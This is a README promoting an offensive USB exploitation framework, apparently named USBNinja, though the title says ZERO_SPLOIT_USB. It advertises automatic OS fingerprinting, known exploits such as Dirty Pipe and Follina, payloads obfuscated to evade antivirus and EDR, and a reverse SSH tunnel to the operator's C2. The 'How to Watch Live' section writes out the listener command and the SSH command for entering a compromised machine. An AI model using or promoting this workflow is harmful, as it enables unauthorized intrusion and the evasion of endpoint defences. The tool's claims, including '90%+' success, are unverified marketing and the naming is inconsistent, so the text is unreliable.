# ZERO_SPLOIT_USB v4.0 Professional Edition

## ⚡ The Ultimate Autonomous Attack Framework

USBNinja v4.0 is engineered for **maximum success (90%+)** and **real-time visibility**. It moves beyond static payload generation into a fully autonomous exploitation suite that you can monitor live from any device.

---

## 🚀 Key Upgrades

### 1. **Autonomous Intelligence (`--auto`)**
- **Fingerprinting**: Instantly identifies OS, Kernel, and Arch.
- **Auto-Selection**: Matches the target with high-reliability exploits (Dirty Pipe, Follina, etc.).
- **90% Success Target**: Payloads are staged and obfuscated to bypass modern AV/EDR.

### 2. **Live Monitoring (The "Live Watch" Feature)**
You no longer have to wait blindly for a session. v4.0 integrates **Reverse SSH** directly into the deployment:
- **How it works**: The payload establishes a secure, encrypted SSH tunnel back to your C2.
- **Live Interaction**: You get a full, interactive terminal session the moment the exploit triggers.
- **Phone/PC Support**: Use any SSH client (like Termux on Android or Terminal on PC) to watch the attack live.

### 3. **C2 Infrastructure Automation**
- Integrated with **Sliver** and **Metasploit RPC** for professional-grade session management.
- Supports **mTLS** and **DNS tunneling** for stealthy communication.

---

## 🛠️ How to Watch Live

1. **Start your C2 Listener**:
   ```bash
   python3 usbninja_v4.py --auto --lhost <YOUR_IP> --lport 4444 --mport 2222
   ```
2. **Deploy the Bundle**:
   Copy the generated `USBNinja_v4_Bundle` to your USB or target system.
3. **Connect Live**:
   Once the attack triggers, open your phone or computer terminal and run:
   ```bash
   ssh -p 2222 operator@<YOUR_IP>
   ```
   *You are now inside the target system with a live, interactive shell.*

---

## 📁 Project Structure (v4.0)
- `usbninja_v4.py`: The new professional-grade entry point.
- `core/`: Advanced fingerprinting and exploit management logic.
- `USBNinja_v4_Bundle/`: The autonomous package ready for deployment.
- `README_v4.md`: This guide.

---

## ⚠️ Legal Disclaimer
For authorized penetration testing and educational use only. Unauthorized use is a violation of law.
